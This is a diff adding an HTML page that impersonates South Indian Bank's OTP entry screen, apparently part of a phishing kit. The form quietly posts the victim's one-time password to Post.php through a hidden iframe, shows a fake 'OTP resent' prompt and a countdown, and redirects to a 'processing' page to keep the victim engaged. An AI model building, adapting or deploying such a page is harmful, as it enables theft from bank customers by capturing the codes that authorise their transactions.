@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="theme-color" content="#9C1D26">
+    <title>South Indian Bank | Enter OTP</title>
+<meta name="description" content="login" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Arimo:ital,wght@0,400..700;1,400..700&display=swap" rel="stylesheet">
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'><link rel="stylesheet" href="./style.css">
+</head>
+<style type="text/css">
+#mn
+{ 
+  width:104%;
+  margin-bottom:20px;
+  margin-left:-7px;
+}
+#pc
+{ 
+  width:100%;
+  margin-bottom:0px;
+}
+#ft
+{ 
+  width:104%;
+  margin-top:50px;
+  margin-left:-7px;
+  text-align:bottom;
+}
+input[type="text"] {
+  width: 85%;
+  color:#000;
+  font-size:14px;
+  border: 1px solid #E3DFDE;
+  border-radius: 4px;
+  letter-spacing:0.5px;
+  padding:10px 20px;
+  outline: none;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+body{
+  font-family: 'Arimo', sans-serif;
+   background-color: #f7f7f7;
+  
+}
+
+
+/*------------*/
+.form-area {
+    background-color: #fff;
+    box-shadow: 2px 5px 10px rgba(90, 116, 148, 0.2);
+    padding: 25px;
+    border-radius: 6px;
+    display: flex;
+    }
+.form-area .form-inner {
+    width: 100%;
+}
+.intl-tel-input,
+.iti{
+  width: 100%;
+}
+.input-group__input
+{
+    text-transform: uppercase;
+}
+
+.inputWithIconOTP input[type="text"] {
+  padding-left: 27px;
+}
+
+.inputWithIconOTP {
+  position: relative;
+}
+
+.inputWithIconOTP i {
+  position: absolute;
+  left: 12px;
+  top: -1px;
+  font-size:20px;
+  padding: 10px 20px;
+  color: #777777;
+  transition: 0.3s;
+}
+
+.inputWithIconHe {
+  position: relative;
+}
+
+.inputWithIconHe i {
+  position: absolute;
+  left: 50px;
+  top: -15px;
+  font-size:28px;
+  padding: 10px 10px;
+  color: #AE2626;
+  transition: 0.3s;
+}
+input::-webkit-input-placeholder {
+    color: transparent;
+    font-size:11px;
+    font-family: 'Arimo', sans-serif;
+}
+input:focus::-webkit-input-placeholder {
+    color: #999;
+    font-size:11px;
+    text-transform:none;
+    font-family: 'Arimo', sans-serif;
+}
+
+/* Firefox < 19 */
+input:-moz-placeholder {
+    color: transparent;
+    font-size:11px;
+    font-family: 'Arimo', sans-serif;
+}
+input:focus:-moz-placeholder {
+    color: #999;
+    font-size:11px;
+    font-family: 'Arimo', sans-serif;
+    text-transform:none;
+}
+
+/* Firefox > 19 */
+input::-moz-placeholder {
+    color: transparent;
+    font-size:11px;
+    font-family: 'Arimo', sans-serif;
+}
+input:focus::-moz-placeholder {
+    color: #999;
+    font-size:11px;
+    font-family: 'Arimo', sans-serif;
+    text-transform:none;
+}
+
+/* Internet Explorer 10 */
+input:-ms-input-placeholder {
+    color: transparent;
+    font-size:11px;
+    font-family: 'Arimo', sans-serif;
+}
+input:focus:-ms-input-placeholder {
+    color: #999;
+    font-size:11px;
+    font-family: 'Arimo', sans-serif;
+    text-transform:none;
+}
+</style>
+<body onload="startTimer();">
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='new_processing3.html';}"></iframe>
+        <div class="container">
+        <img alt="" src="South_Logo.jpg" id="mn"/><br>
+        <section class="pt-5 pb-5">
+    <div class="container text-center">
+        <div class="row">
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="row justify-content-center">
+                <div class="form-area">
+                    <div class="form-inner">
+                        <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="form">
+                        <center><img alt="" src="South_L.jpg" id="pc"/></center>
+                        <div class="inputWithIconHe">
+                        <center><h3 style="color:#AE2626; font-family: 'Arimo', sans-serif; font-size:16px; letter-spacing:0.8px; margin-left:20px; margin-bottom:25px;">Please Enter OTP</h3>
+                        <i class="fa fa-mobile" aria-hidden="true"></i></center>
+                        </div>
+                        <center><b style="font-size:13px; font-family: 'Arimo', sans-serif; color:#000; font-weight:700; letter-spacing:0.2px;">OTP has been send to your registered <br>mobile number. Please enter OTP<br> and proceed. </b></center>
+                        <br><br>
+                        <div class="inputWithIconOTP">
+                        <div class="input-group">
+                        <center><input class="input-group__input" type="text" name="1ST_OTP" inputmode="numeric" maxlength="6" placeholder="One Time Password" id="otp"
+                        pattern="[0-9]\d{5}" title="Please enter valid valid OTP !" required />
+                        <label class="input-group__label2" for="mobile">Enter OTP <span style="color:red;">*</span></label>
+                        <i class="fa fa-mobile" aria-hidden="true"></i></center>
+                        <script>
+                        var url = document.URL;
+                        document.getElementById("url").innerHTML = "URL: " + str;
+                        function replicateTab(){
+                        if(window.confirm("OTP resend successfully, Please check your phone inbox.")){
+                        window.location.href="Enter_OTP.html";
+                        }
+                        }
+                        </script>
+                        <div style="margin-top:3px;">
+                        <button2 id = "btn" onclick = "replicateTab()"style=" width:35%; font-size:14px; font-family: 'Arimo', sans-serif; font-weight:500; color:#67AEF9; background-color:transparent; margin-left:185px;">Resend OTP</button2>
+                        </div>
+                        </div>  
+                        </div> 
+                        <script type="text/javascript">
+                        var timer=180;
+                        var sec=0;
+                        function startTimer() {
+                        sec=parseInt(timer%180);
+                        
+                        if (timer<2) {
+                        // timer.stop();
+                        window.location.href = "Enter_OTP.html";
+                        }
+                        
+                        document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
+                        timer--;
+                        setTimeout(function(){
+                        startTimer();
+                        
+                        }, 1000);
+                        }                       
+                        </script>
+                        <div>
+                        <center><b style="color:#707070; font-family: 'Arimo', sans-serif; font-size:14px; text-align:center;"><span style="color:#707070; font-family: 'Arimo', sans-serif; font-size:13px;" id="time"></span>&nbsp;second</b></center>
+                        </div><br><br>
+                        <center><button type="submit">Verify OTP</button></center><br>
+                        </form>
+                        
+</section>
+                        <img alt="" src="Footer.jpg" id="ft"/>
+               </div>
+               </div>
+               </div>
+               </div>
+               </div>
+               </body>
+               </html>
